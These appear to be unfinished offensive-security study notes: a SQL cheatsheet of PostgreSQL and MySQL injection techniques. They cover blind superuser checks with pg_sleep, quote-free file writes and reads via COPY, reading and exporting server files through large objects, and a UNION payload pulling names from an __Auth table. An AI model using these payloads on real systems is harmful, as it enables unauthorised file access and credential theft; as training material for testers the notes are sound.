## SQL Command Cheatsheet

This section is under construction.

### PostgreSQL

- Get if superuser value
```sql
SELECT current_setting('is_superuser');
```

- Blind SQL check for superuser
```sql
SELECT (CASE WHEN (current_setting($$is_superuser$$)=$$on$$) THEN pg_sleep(3) ELSE pg_sleep(0) END);
```

- Write to FS with quotes not allowed
```sql
COPY (select $$awae$$) to $$C:\Windows\Temp\TestING.txt$$
```

- Read from a file into a table (Don't drop until you've read it)
```sql
CREATE temp table awae (content text);
COPY awae from $$c:\Windows\Temp\TestING.txt$$;
SELECT content from awae;
DROP table awae;
```

- b64 Decode / Convert to utf-8
```sql
COPY(SELECT convert_from(decode($$d3JpdGluZyB0aGlzIGRhdGEgdG8gbXkgbmV3IGZpbGUK$$,$$base64$$),$$utf-8$$)) to $${filename}$$;--+"
```

### Large Objects

- Create a LO
```sql
select lo_import('C:\\Windows\\win.ini', 1337);
```

- View `pg_largeobject` table
```sql
amdb=# select loid, pageno from pg_largeobject;
 loid | pageno
------+--------
 1337 |      0
(1 row)
```

- View LO data
```sql
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno |           encode
------+--------+----------------------------
 1337 |      0 | ; for 16-bit app support\r+
      |        | [fonts]\r                 +
      |        | [extensions]\r            +
      |        | [mci extensions]\r        +
      |        | [files]\r                 +
      |        | [Mail]\r                  +
      |        | MAPI=1\r                  +
      |        |
(1 row)
```

- Update LO data
```sql
amdb=# update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
UPDATE 1
amdb=# select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno | encode
------+--------+--------
 1337 |      0 | w00t
(1 row)
```

- Export LO to new file
```sql
amdb=# select lo_export(1337, 'C:\\new_win.ini');
 lo_export
-----------
         1
(1 row)
```

- To delete a large object, we'll use:
```sql
amdb=# \lo_unlink 1337
lo_unlink 1337
amdb=# \lo_list
      Large objects
 ID | Owner | Description
----+-------+-------------
(0 rows)
```


### MySQL

- Configure verbose query logging
```
/etc/mysql/my.cnf
...
general_log_file        = /var/log/mysql/mysql.log
general_log             = 1
sudo systemctl restart mysql
```

- Get collation name (Set table name as necessary)
```sql
SELECT COLLATION_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "__global_search" AND COLUMN_NAME = "name";
```

- Use COLLATE in a query
```cmd
scope=toby_scope" UNION SELECT 1,2,name COLLATE utf8mb4_general_ci,4,5 FROM __Auth# 
```
